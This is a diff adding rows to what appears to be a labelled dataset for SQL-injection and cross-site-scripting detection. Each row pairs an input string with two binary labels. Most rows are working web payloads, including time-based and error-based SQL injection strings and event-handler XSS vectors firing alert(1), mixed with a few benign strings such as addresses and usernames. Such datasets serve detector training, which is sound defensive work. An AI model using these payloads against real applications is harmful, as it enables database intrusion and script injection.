@@ -1,0 +1,29 @@
+2611	-7199' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'qibr'  =  'qibr	1	0
+19201	"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frameset>"	0	1
+15710	<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>	0	1
+19077	"<style>@keyframes slidein {}</style><li style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></li>"	0	1
+15744	<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>	0	1
+16584	"<dfn draggable=""true"" ondragend=""alert(1)"">test</dfn>"	0	1
+19675	"<svg draggable=""true"" ondragstart=""alert(1)"">test</svg>"	0	1
+2843	1%'   )    )     )   and sleep  (  5  )  #	1	0
+20116	<time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>	0	1
+12137	"calle toronja, 157"	0	0
+18241	"<section onbeforepaste=""alert(1)"" contenteditable>test</section>"	0	1
+2408	"1'   )    )    as uuuk where 7234  =  7234 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --"	1	0
+18664	"<style>:target {color: red;}</style><nav id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></nav>"	0	1
+16114	"<button onbeforecut=""alert(1)"" contenteditable>test</button>"	0	1
+2573	"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'gcna'  =  'gcna"	1	0
+13367	san bartolom de las abiertas	0	0
+15251	8n66ies4a	0	0
+3306	1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--	1	0
+1574	"1'||  (  select 'qsgi' where 1707  =  1707 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'"	1	0
+14641	rakin	0	0
+2741	"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm"	1	0
+19650	"<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>"	0	1
+12017	maribeth4	0	0
+15372	<math><brute href=javascript:alert(1)>click 	0	1
+16889	"<div draggable=""true"" contenteditable>drag me</div><samp ondragover=alert(1) contenteditable>drop here</samp>"	0	1
+15901	"<bgsound draggable=""true"" ondragstart=""alert(1)"">test</bgsound>"	0	1
+19558	"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationstart=""alert(1)""></track>"	0	1
+2054	-4523 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) 	1	0
+20717	"<img src=""javascript:alert(2)"">"	0	1
